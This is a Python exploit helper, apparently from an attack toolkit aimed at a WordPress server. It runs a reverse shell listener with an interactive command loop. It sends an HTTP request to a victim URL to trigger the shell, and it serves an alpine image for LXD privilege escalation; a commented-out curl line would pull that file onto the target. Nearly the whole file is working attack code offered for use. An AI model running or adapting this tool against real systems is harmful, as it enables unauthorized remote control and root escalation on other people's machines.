import socket, sys, time, os, requests, datetime, re, random, errno
import threading

def listen(ip,port, t2, r_port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if check_port(ip, port):
		sys.exit('Port Already in use')
	s.bind((ip, port))
	s.listen(1)
	print("Listening on port " + str(port))
	con = None
	conn, addr = s.accept()
	print('Connection received from ',addr)
	print('=================================================')
	print('=                Reverse Shell                  =')
	print('=================================================')
	print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
	try:
		t2.start() # This thread will be daemon, however it will close once the main thread closes, so we don't run into the problem of keeping it always on
		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
		print('[+] Waiting for connection')
		time.sleep(0.5)
		#ans = conn.recv(1024).decode()
		#command = '''
		#cd /srv/www/wordpress
		#curl {ip}:{r_port} --output {r_port}_file.tar.gz
		#'''
		#conn.send(command.encode())
		#time.sleep(1)
		#sys.stdout.write("\033[A" + ans.split("\n")[-1])
		while True:
			#Receive data from the target and get user input
			ans = conn.recv(1024).decode()
			sys.stdout.write(ans)
			command = input()

			#Send command
			command += "\n"
			conn.send(command.encode())
			time.sleep(1)

		#	#Remove the output of the "input()" function
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
			print("")
	except KeyboardInterrupt:
		if conn:
			print('\n[-] Unbinding...')
			conn.close()
	conn.close()
        
def listen_shell(ip, port, v_ip, v_port):
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(ip, r_port):
		r_port = random.randint(1024, 65536)
		
	t1 = threading.Thread(target=task, args=(v_ip, v_port))
	t2 = threading.Thread(target=task2, args=(ip, r_port), daemon=True)
	t1.start()
	listen(ip, int(port), t2, r_port)
	
def task(v_ip, v_port):

	time.sleep(0.5)
	now = datetime.datetime.now()
	print('[*] Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		print('[*] Making request to execute reverse shell, verify your listener')
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=0.0000000001)
		except requests.exceptions.ReadTimeout: 
	    		pass
		os.remove('./tmp_file_with_dest_url.txt')
		print('[*] The exact time before lauching the exploit was: ', now)
		print('[*] You can use this time to help you filter the syscall logs')
		

	else:
		print('[-] URL wasn\'t generated, you might need to run the exploit another time')
		print('[-] If the problem persists, please confirm the information you passed')
		
		sys.exit()
		
# This will invoke the a server to download the file that is going to be executed on the victim
def task2(ip, r_port):
	file_name = get_file_name() # Searchs for the file, since it adds the time of compilation onto its name
	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py ./{file_name} {r_port}'.format(file_name=file_name, r_port=r_port))
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		  
		# if match is found
		if match:
			return file
